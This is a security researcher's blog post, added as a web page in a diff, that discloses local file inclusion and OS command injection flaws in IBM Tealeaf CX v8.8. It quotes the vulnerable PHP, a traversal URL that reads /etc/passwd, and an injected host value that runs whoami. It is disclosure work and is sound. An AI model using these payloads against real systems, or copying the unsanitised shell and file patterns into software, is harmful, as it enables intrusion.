@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI</h1>
+			<b><time>2014-03-26</time></b>
+		       
+
+			<div>
+				<p>Tealeaf Technologies was <a href="http://techcrunch.com/2012/05/02/ibm-acquires-tealeaf-to-add-customer-buying-analytics-to-smarter-commerce-products/">purchased</a> by IBM in May of 2012, and is a customer buying analytics application.  Essentially, an administrator will configure a Tealeaf server that accepts analytic data from remote servers, which it then generates various models, graphs, reports, etc based on the aggregate of data.
+Their analytics status/server monitoring application is vulnerable to a fairly trivial OS command injection vulnerability, as well as local file inclusion.  This vulnerability was discovered on a PCI engagement against a large retailer; the LFI was used to pull PHP files and hunt for RCE.</p>
+<p>The entire application is served up by default on port 8080 and is developed in PHP.  Authentication by default is disabled, however, support for Basic Auth appears to exist.  This interface allows administrators access to statistics, logs, participating servers, and more.  Contained therein is the ability to obtain application logs, such as configuration, maintenance, access, and more.  The log parameter is vulnerable to LFI:</p>
+<pre tabindex="0"><code>if(array_key_exists(&#34;log&#34;, $params))
+$path = $config-&gt;logfiledir() . &#34;/&#34; . $params[&#34;log&#34;];
+
+
+$file = basename($path);
+$size = filesize($path);
+
+// Set the cache-control and expiration date so that the file expires
+// immediately after download.
+//
+$rfc1123date = gmdate(&#39;D, d M Y H:i:s T&#39;, 1);
+header(&#39;Cache-Control: max-age=0, must-revalidate, post-check=0, pre-check=0&#39;);
+header(&#34;Expires: &#34; . $rfc1123date);
+
+header(&#34;Content-Type: application/octet-stream&#34;);
+header(&#34;Content-Disposition: attachment; filename=$file;&#34;);
+header(&#34;Content-Length: $size;&#34;);
+
+readfile($path);
+</code></pre><p>The URL then is <code>http://host:8080/download.php?log=../../../etc/passwd</code></p>
+<p>Tealeaf also suffers from a rather trivial remote OS command injection vulnerability.  Under the Delivery tab, there exists the option to ping remote servers that send data back to the mothership.  Do you see where this is going?</p>
+<pre tabindex="0"><code>if ($_POST[&#34;perform_action&#34;] == &#34;testconn&#34;) {
+    $host = $_POST[&#34;testconn_host&#34;];
+    $port = $_POST[&#34;testconn_port&#34;];
+    $use_t = strtolower($_POST[&#34;testconn_t&#34;]) == &#34;true&#34; ? true : false;
+    $command = $GLOBALS[&#34;config&#34;]-&gt;testconn_program() . &#39; &#39;;
+    if($use_t)
+    $output = trim(shell_command_output($command . $host . &#34; -p &#34; . $port . &#34; -t&#34;));
+    else
+    $output = trim(shell_command_output($command . $host . &#34; -p &#34; . $port));
+
+    if($output != &#34;&#34;) {
+        $alert_function = &#34;alert(&#39;&#34; . str_replace(&#34;\n&#34;, &#34;\\n&#34;,
+        htmlentities($output, ENT_QUOTES)) . &#34;&#39;)&#34;;
+    }
+
+    $_SESSION[&#39;delivery&#39;]-&gt;pending_changes = $orig_pending_changes;
+}
+</code></pre><p>And shell_command_output:</p>
+<pre tabindex="0"><code>function shell_command_output($command) {
+    $result = `$command 2&gt;&amp;1`;
+    if (strlen($result) &gt; 0)
+    return $result;
+}
+</code></pre><p>Harnessing the <code>$host</code> variable, we can inject arbitrary commands to run under the context of the process user, which by default is <code>ctccap</code>.  In order to exploit this without hanging processes or goofing up flow, I injected the following as the host variable: <code>8.8.8.8 -c 1 ; whoami ; ping 8.8.8.8 -c 1</code>.</p>
+<!-- raw HTML omitted -->
+<p><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667630">Advisory</a><br>
+<a href="http://www.exploit-db.com/exploits/32546/">exploit-db PoC</a></p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
